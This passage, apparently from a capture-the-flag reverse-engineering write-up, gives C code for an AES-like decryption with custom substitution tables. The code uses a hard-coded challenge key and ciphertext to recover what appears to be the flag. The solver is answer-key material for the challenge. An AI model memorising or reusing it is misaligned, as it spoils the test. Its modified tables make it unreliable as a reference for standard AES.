    0xF5, 0x0C, 0x23, 0x3A, 0x51, 0x68, 0x7F, 0x96, 0xAD, 0xC4,
    0xDB, 0xF2, 0x09, 0x20, 0x37, 0x4E, 0x65, 0x7C, 0x93, 0xAA,
    0xC1, 0xD8, 0xEF, 0x06, 0x1D, 0x34, 0x4B, 0x62, 0x79, 0x90,
    0xA7, 0xBE, 0xD5, 0xEC, 0x03, 0x1A, 0x31, 0x48, 0x5F, 0x76,
    0x8D, 0xA4, 0xBB, 0xD2, 0xE9, 0x00, 0x17, 0x2E, 0x45, 0x5C,
    0x73, 0x8A, 0xA1, 0xB8, 0xCF, 0xE6, 0xFD, 0x14, 0x2B, 0x42,
    0x59, 0x70, 0x87, 0x9E, 0xB5, 0xCC, 0xE3, 0xFA, 0x11, 0x28,
    0x3F, 0x56, 0x6D, 0x84, 0x9B, 0xB2, 0xC9, 0xE0, 0xF7, 0x0E,
    0x25, 0x3C, 0x53, 0x6A, 0x81, 0x98, 0xAF, 0xC6, 0xDD, 0xF4,
    0x0B, 0x22, 0x39, 0x50, 0x67, 0x7E, 0x95, 0xAC, 0xC3, 0xDA,
    0xF1, 0x08, 0x1F, 0x36, 0x4D, 0x64, 0x7B, 0x92, 0xA9, 0xC0,
    0xD7, 0xEE, 0x05, 0x1C, 0x33, 0x4A, 0x61, 0x78, 0x8F, 0xA6,
    0xBD, 0xD4, 0xEB, 0x02, 0x19, 0x30, 0x47, 0x5E, 0x75, 0x8C,
    0xA3, 0xBA, 0xD1, 0xE8, 0xFF, 0x16, 0x2D, 0x44, 0x5B, 0x72,
    0x89, 0xA0, 0xB7, 0xCE, 0xE5, 0xFC, 0x13, 0x2A, 0x41, 0x58,
    0x6F, 0x86, 0x9D, 0xB4, 0xCB, 0xE2, 0xF9, 0x10, 0x27, 0x3E,
    0x55, 0x6C, 0x83, 0x9A, 0xB1, 0xC8, 0xDF, 0xF6, 0x0D, 0x24,
    0x3B, 0x52, 0x69, 0x80, 0x97, 0xAE, 0xC5, 0xDC, 0xF3, 0x0A,
    0x21, 0x38, 0x4F, 0x66, 0x7D, 0x94, 0xAB, 0xC2, 0xD9, 0xF0,
    0x07, 0x1E, 0x35, 0x4C, 0x63, 0x7A, 0x91, 0xA8, 0xBF, 0xD6,
    0xED, 0x04, 0x1B, 0x32, 0x49, 0x60, 0x77, 0x8E, 0xA5, 0xBC,
    0xD3, 0xEA, 0x01, 0x18, 0x2F, 0x46, 0x5D, 0x74, 0x8B, 0xA2,
    0xB9, 0xD0, 0xE7, 0xFE, 0x15, 0x2C, 0x43, 0x5A, 0x71, 0x88,
    0x9F, 0xB6, 0xCD, 0xE4, 0xFB, 0x12 };

/**
 * 逆S盒
 */
static const int S2[16][16] = {
   0x41,0xE8,0x8F,0x36,0xDD,0x84,0x2B,0xD2,0x79,0x20,0xC7,0x6E,0x15,0xBC,0x63,0x0A,

0xB1,0x58,0xFF,0xA6,0x4D,0xF4,0x9B,0x42,0xE9,0x90,0x37,0xDE,0x85,0x2C,0xD3,0x7A,

0x21,0xC8,0x6F,0x16,0xBD,0x64,0x0B,0xB2,0x59,0x00,0xA7,0x4E,0xF5,0x9C,0x43,0xEA,

0x91,0x38,0xDF,0x86,0x2D,0xD4,0x7B,0x22,0xC9,0x70,0x17,0xBE,0x65,0x0C,0xB3,0x5A,

0x01,0xA8,0x4F,0xF6,0x9D,0x44,0xEB,0x92,0x39,0xE0,0x87,0x2E,0xD5,0x7C,0x23,0xCA,

0x71,0x18,0xBF,0x66,0x0D,0xB4,0x5B,0x02,0xA9,0x50,0xF7,0x9E,0x45,0xEC,0x93,0x3A,

0xE1,0x88,0x2F,0xD6,0x7D,0x24,0xCB,0x72,0x19,0xC0,0x67,0x0E,0xB5,0x5C,0x03,0xAA,

0x51,0xF8,0x9F,0x46,0xED,0x94,0x3B,0xE2,0x89,0x30,0xD7,0x7E,0x25,0xCC,0x73,0x1A,

0xC1,0x68,0x0F,0xB6,0x5D,0x04,0xAB,0x52,0xF9,0xA0,0x47,0xEE,0x95,0x3C,0xE3,0x8A,

0x31,0xD8,0x7F,0x26,0xCD,0x74,0x1B,0xC2,0x69,0x10,0xB7,0x5E,0x05,0xAC,0x53,0xFA,

0xA1,0x48,0xEF,0x96,0x3D,0xE4,0x8B,0x32,0xD9,0x80,0x27,0xCE,0x75,0x1C,0xC3,0x6A,

0x11,0xB8,0x5F,0x06,0xAD,0x54,0xFB,0xA2,0x49,0xF0,0x97,0x3E,0xE5,0x8C,0x33,0xDA,

0x81,0x28,0xCF,0x76,0x1D,0xC4,0x6B,0x12,0xB9,0x60,0x07,0xAE,0x55,0xFC,0xA3,0x4A,

0xF1,0x98,0x3F,0xE6,0x8D,0x34,0xDB,0x82,0x29,0xD0,0x77,0x1E,0xC5,0x6C,0x13,0xBA,

0x61,0x08,0xAF,0x56,0xFD,0xA4,0x4B,0xF2,0x99,0x40,0xE7,0x8E,0x35,0xDC,0x83,0x2A,

0xD1,0x78,0x1F,0xC6,0x6D,0x14,0xBB,0x62,0x09,0xB0,0x57,0xFE,0xA5,0x4C,0xF3,0x9A, };

/**
 * 获取整形数据的低8位的左4个位
 */
static int getLeft4Bit(int num) {
    int left = num & 0x000000f0;
    return left >> 4;
}

/**
 * 获取整形数据的低8位的右4个位
 */
static int getRight4Bit(int num) {
    return num & 0x0000000f;
}
/**
 * 根据索引，从S盒中获得元素
 */
static int getNumFromSBox(int index) {
    int row = getLeft4Bit(index);
    int col = getRight4Bit(index);
    return S[row][col];
}

/**
 * 把一个字符转变成整型
 */
static int getIntFromChar(char c) {
    int result = (int)c;
    return result & 0x000000ff;
}

/**
 * 把16个字符转变成4X4的数组，
 * 该矩阵中字节的排列顺序为从上到下，
 * 从左到右依次排列。
 */
static void convertToIntArray(char* str, int pa[4][4]) {
    int k = 0;
    int i, j;
    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++) {
            pa[j][i] = getIntFromChar(str[k]);
            k++;
        }
}

/**
 * 把连续的4个字符合并成一个4字节的整型
 */
static int getWordFromStr(char* str) {
    int one, two, three, four;
    one = getIntFromChar(str[0]);
    one = one << 24;
    two = getIntFromChar(str[1]);
    two = two << 16;
    three = getIntFromChar(str[2]);
    three = three << 8;
    four = getIntFromChar(str[3]);
    return one | two | three | four;
}

/**
 * 把一个4字节的数的第一、二、三、四个字节取出，
 * 入进一个4个元素的整型数组里面。
 */
static void splitIntToArray(int num, int array[4]) {
    int one, two, three;
    one = num >> 24;
    array[0] = one & 0x000000ff;
    two = num >> 16;
    array[1] = two & 0x000000ff;
    three = num >> 8;
    array[2] = three & 0x000000ff;
    array[3] = num & 0x000000ff;
}

/**
 * 将数组中的元素循环左移step位
 */
static void leftLoop4int(int array[4], int step) {
    int temp[4];
    int i;
    int index;
    for (i = 0; i < 4; i++)
        temp[i] = array[i];

    index = step % 4 == 0 ? 0 : step % 4;
    for (i = 0; i < 4; i++) {
        array[i] = temp[index];
        index++;
        index = index % 4;
    }
}

/**
 * 把数组中的第一、二、三和四元素分别作为
 * 4字节整型的第一、二、三和四字节，合并成一个4字节整型
 */
static int mergeArrayToInt(int array[4]) {
    int one = array[0] << 24;
    int two = array[1] << 16;
    int three = array[2] << 8;
    int four = array[3];
    return one | two | three | four;
}

/**
 * 常量轮值表
 */
static const int Rcon[10] = { 0x01000000, 0x02000000,
    0x04000000, 0x08000000,
    0x10000000, 0x20000000,
    0x40000000, 0x80000000,
    0x1b000000, 0x36000000 };
/**
 * 密钥扩展中的T函数
 */
static int T(int num, int round) {
    int numArray[4];
    int i;
    int result;
    splitIntToArray(num, numArray);
    leftLoop4int(numArray, 1);//字循环

    //字节代换
    for (i = 0; i < 4; i++)
        numArray[i] = getNumFromSBox(numArray[i]);

    result = mergeArrayToInt(numArray);
    return result ^ Rcon[round];
}

//密钥对应的扩展数组
static int w[44];


/**
 * 扩展密钥，结果是把w[44]中的每个元素初始化
 */
static void extendKey(char* key) {
    int i, j;
    for (i = 0; i < 4; i++)
        w[i] = getWordFromStr(key + i * 4);

    for (i = 4, j = 0; i < 44; i++) {
        if (i % 4 == 0) {
            w[i] = w[i - 4] ^ T(w[i - 1], j);
            j++;//下一轮
        }
        else {
            w[i] = w[i - 4] ^ w[i - 1];
        }
    }

}

/**
 * 轮密钥加
 */
static void addRoundKey(int array[4][4], int round) {
    int warray[4];
    int i, j;
    for (i = 0; i < 4; i++) {

        splitIntToArray(w[round * 4 + i], warray);

        for (j = 0; j < 4; j++) {
            array[j][i] = array[j][i] ^ warray[j];
        }
    }
}





static int GFMul2(int s) {
    int result = s << 1;
    int a7 = result & 0x00000100;

    if (a7 != 0) {
        result = result & 0x000000ff;
        result = result ^ 0x1b;
    }

    return result;
}

static int GFMul3(int s) {
    return GFMul2(s) ^ s;
}

static int GFMul4(int s) {
    return GFMul2(GFMul2(s));
}

static int GFMul8(int s) {
    return GFMul2(GFMul4(s));
}

static int GFMul9(int s) {
    return GFMul8(s) ^ s;
}

static int GFMul11(int s) {
    return GFMul9(s) ^ GFMul2(s);
}

static int GFMul12(int s) {
    return GFMul8(s) ^ GFMul4(s);
}

static int GFMul13(int s) {
    return GFMul12(s) ^ s;
}

static int GFMul14(int s) {
    return GFMul12(s) ^ GFMul2(s);
}

/**
 * GF上的二元运算
 */
static int GFMul(int n, int s) {
    int result;

    if (n == 1)
        result = s;
    else if (n == 2)
        result = GFMul2(s);
    else if (n == 3)
        result = GFMul3(s);
    else if (n == 0x9)
        result = GFMul9(s);
    else if (n == 0xb)//11
        result = GFMul11(s);
    else if (n == 0xd)//13
        result = GFMul13(s);
    else if (n == 0xe)//14
        result = GFMul14(s);

    return result;
}

/**
 * 把4X4数组转回字符串
 */
static void convertArrayToStr(int array[4][4], char* str) {
    int i, j;
    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++)
            *str++ = (char)array[j][i];
}

/**
 * 根据索引从逆S盒中获取值
 */
static int getNumFromS1Box(int index) {
    int row = getLeft4Bit(index);
    int col = getRight4Bit(index);
    return S2[row][col];
}
/**
 * 逆字节变换
 */
static void deSubBytes(int array[4][4]) {
    int i, j;
    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++)
            array[i][j] = getNumFromS1Box(array[i][j]);
}
/**
 * 把4个元素的数组循环右移step位
 */
static void rightLoop4int(int array[4], int step) {
    int temp[4];
    int i;
    int index;
    for (i = 0; i < 4; i++)
        temp[i] = array[i];

    index = step % 4 == 0 ? 0 : step % 4;
    index = 3 - index;
    for (i = 3; i >= 0; i--) {
        array[i] = temp[index];
        index--;
        index = index == -1 ? 3 : index;
    }
}

/**
 * 逆行移位
 */
static void deShiftRows(int array[4][4]) {
    int rowTwo[4], rowThree[4], rowFour[4];
    int i;
    for (i = 0; i < 4; i++) {
        rowTwo[i] = array[1][i];
        rowThree[i] = array[2][i];
        rowFour[i] = array[3][i];
    }

    rightLoop4int(rowTwo, 1);
    rightLoop4int(rowThree, 2);
    rightLoop4int(rowFour, 3);

    for (i = 0; i < 4; i++) {
        array[1][i] = rowTwo[i];
        array[2][i] = rowThree[i];
        array[3][i] = rowFour[i];
    }
}
/**
 * 逆列混合用到的矩阵
 */
static const int deColM[4][4] = { 0xe, 0xb, 0xd, 0x9,
    0x9, 0xe, 0xb, 0xd,
    0xd, 0x9, 0xe, 0xb,
    0xb, 0xd, 0x9, 0xe };

/**
 * 逆列混合
 */
static void deMixColumns(int array[4][4]) {
    int tempArray[4][4];
    int i, j;
    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++)
            tempArray[i][j] = array[i][j];

    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++) {
            array[i][j] = GFMul(deColM[i][0], tempArray[0][j]) ^ GFMul(deColM[i][1], tempArray[1][j])
                ^ GFMul(deColM[i][2], tempArray[2][j]) ^ GFMul(deColM[i][3], tempArray[3][j]);
        }
}
/**
 * 把两个4X4数组进行异或
 */
static void addRoundTowArray(int aArray[4][4], int bArray[4][4]) {
    int i, j;
    for (i = 0; i < 4; i++)
        for (j = 0; j < 4; j++)
            aArray[i][j] = aArray[i][j] ^ bArray[i][j];
}
/**
 * 从4个32位的密钥字中获得4X4数组，
 * 用于进行逆列混合
 */
static void getArrayFrom4W(int i, int array[4][4]) {
    int index, j;
    int colOne[4], colTwo[4], colThree[4], colFour[4];
    index = i * 4;
    splitIntToArray(w[index], colOne);
    splitIntToArray(w[index + 1], colTwo);
    splitIntToArray(w[index + 2], colThree);
    splitIntToArray(w[index + 3], colFour);

    for (j = 0; j < 4; j++) {
        array[j][0] = colOne[j];
        array[j][1] = colTwo[j];
        array[j][2] = colThree[j];
        array[j][3] = colFour[j];
    }

}

/**
 * 参数 c: 密文的字符串数组。
 * 参数 clen: 密文的长度。
 * 参数 key: 密钥的字符串数组。
 */
void deAes(char* c, int clen, char* key) {

    int cArray[4][4];
    int keylen, k;
    keylen = strlen(key);
    if (clen == 0 || clen % 16 != 0) {
        printf("密文字符长度必须为16的倍数！现在的长度为%d\n", clen);
        exit(0);
    }

    extendKey(key);//扩展密钥

    for (k = 0; k < clen; k += 16) {
        int i;
        int wArray[4][4];

        convertToIntArray(c + k, cArray);
        addRoundKey(cArray, 10);

        for (i = 9; i >= 1; i--) {
            deSubBytes(cArray);
            deShiftRows(cArray);
            deMixColumns(cArray);
            getArrayFrom4W(i, wArray);
            deMixColumns(wArray);

            addRoundTowArray(cArray, wArray);
        }
        deSubBytes(cArray);
        deShiftRows(cArray);
        addRoundKey(cArray, 0);
        convertArrayToStr(cArray, c + k);

    }
}
int main() {
    char encodebuffer[] = { 0x2B, 0xC8, 0x20, 0x8B, 0x5C, 0xD, 0xA7, 0x9B, 0x2A, 0x51, 0x3A, 0xD2, 0x71, 0x71, 0xCA, 0x50 };
    char* key = (char*)"Re_1s_eaSy123456";
    deAes(encodebuffer, 16, key);
    printf("%s", encodebuffer);
}
```

![25](https://cdn.ha1c9on.top/img/25.png)

Just type it in.

![26](https://cdn.ha1c9on.top/img/26.png)